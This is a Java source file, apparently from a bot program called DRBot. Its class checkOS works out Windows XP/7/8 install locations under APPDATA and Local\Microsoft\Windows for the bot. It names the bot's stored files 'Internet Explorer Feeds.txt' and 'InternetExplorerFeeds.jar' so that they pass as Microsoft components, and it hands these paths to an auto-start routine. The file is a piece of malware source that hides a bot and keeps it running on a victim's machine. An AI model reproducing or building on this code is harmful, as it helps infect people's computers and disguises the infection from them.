package com.DRBot.OS;

import java.io.File;
import com.DRBot.Auto.Win.AutoWin;
//import com.DRBot.Auto.Linux.AutoLinux;

public class checkOS {
    
    private String os_plat,os_appPath;
    private static String botName;
    private final File mainMethod;
    private AutoWin autoWin;
    private static File botPath,encPath,secPath;
    
    public checkOS(String botName,File mainMethod){
        this.mainMethod = mainMethod;
        checkOS.botName = botName;
        execute();
    }
    private void execute(){
        OsProp newChecker = new OsProp();
        os_plat = newChecker.getOsName();
        
        os_appPath = System.getenv("APPDATA");
        os_appPath = os_appPath.replace("\\","\\\\").replace("%20"," ");
        switch (os_plat) {
            case "windows 7":
            case "windows 8":
            case "windows 8.1":
                {
                    //windows 7 path
                    botPath = new File(os_appPath + "\\" + checkOS.botName);
                    File tempPath = new File(os_appPath);
                    File tempPath1 = tempPath.getParentFile();
                    encPath = new File(tempPath1.getPath()+"\\Local\\Microsoft");
                    secPath = new File(encPath.getPath()+"\\Windows");
                    autoWin = new AutoWin(this.mainMethod,botPath,encPath,secPath);
                    break;
                }
            case "windows xp":
                //windows xp
                botPath = new File(os_appPath+ "\\" + checkOS.botName);
                encPath = new File(os_appPath+ "\\Microsoft");
                secPath = new File(encPath.getPath()+"\\Windows");
                autoWin = new AutoWin(this.mainMethod,botPath,encPath,secPath);
                break;
        }
    }
    public static String getBotPath(){
        return botPath.getPath();
    }
    public static String getEncPath(){
        return encPath.getPath()+"\\Internet Explorer Feeds.txt";
    }
    public static String getsecPath(){
        return secPath.getPath()+"\\InternetExplorerFeeds.jar";
    }
    public static String getBotName(){
        return botName;
    }
}
